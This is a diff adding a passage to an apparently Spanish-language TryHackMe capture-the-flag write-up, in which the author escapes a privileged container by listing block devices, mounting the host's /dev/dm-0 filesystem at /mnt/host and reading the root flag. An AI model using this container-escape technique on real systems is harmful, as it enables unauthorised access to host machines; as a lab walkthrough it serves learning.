@@ -618,3 +618,77 @@ ls
 flag
 cat flag
 THM{4_******************go}
+
+Vale, ahora voy a salir del container(no se que más hacer en esta máquina).
+
+Veo las particiones.
+
+ls -la /dev | grep disk
+crw-rw----  1 root disk     10, 234 Jul 30 10:49 btrfs-control
+brw-rw----  1 root disk    253,   0 Jul 30 10:49 dm-0
+crw-rw----  1 root disk     10, 237 Jul 30 10:49 loop-control
+brw-rw----  1 root disk      7,   0 Jul 30 10:49 loop0
+brw-rw----  1 root disk      7,   1 Jul 30 10:49 loop1
+brw-rw----  1 root disk      7,   2 Jul 30 10:49 loop2
+brw-rw----  1 root disk      7,   3 Jul 30 10:49 loop3
+brw-rw----  1 root disk      7,   4 Jul 30 10:49 loop4
+brw-rw----  1 root disk      7,   5 Jul 30 10:49 loop5
+brw-rw----  1 root disk      7,   6 Jul 30 10:49 loop6
+brw-rw----  1 root disk      7,   7 Jul 30 10:49 loop7
+brw-rw----  1 root disk    202,   0 Jul 30 10:49 xvda
+brw-rw----  1 root disk    202,   1 Jul 30 10:49 xvda1
+brw-rw----  1 root disk    202,   2 Jul 30 10:49 xvda2
+brw-rw----  1 root disk    202,   3 Jul 30 10:49 xvda3
+brw-rw----  1 root disk    202, 112 Jul 30 10:49 xvdh
+
+Creo un punto de montaje.
+mkdir -p /mnt/host
+
+Veo que hay en cada disco, hasta que encuentro esto.
+
+/dev/dm-0: Linux rev 1.0 ext4 filesystem data, UUID=43221da0-44f1-4a13-b16b-7516f51f4dfe (needs journal recovery) (extents) (64bit) (large files) (huge files)
+El UUID indica que este es el dispositivo de mapeo que permite crear volumenes lógicos. (El sistema de archivos, vaya)
+
+Lo monto.
+mount /dev/dm-0 /mnt/host
+cd /mnt/host
+ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+swap.img
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+
+Efectivamente es el sistema de archivos.
+
+Ahora solo me queda buscar la última flag.
+
+Estaba en el directorio de root.
+
+cd root
+ls
+flag
+cat flag
+THM{6_***********************************_t}
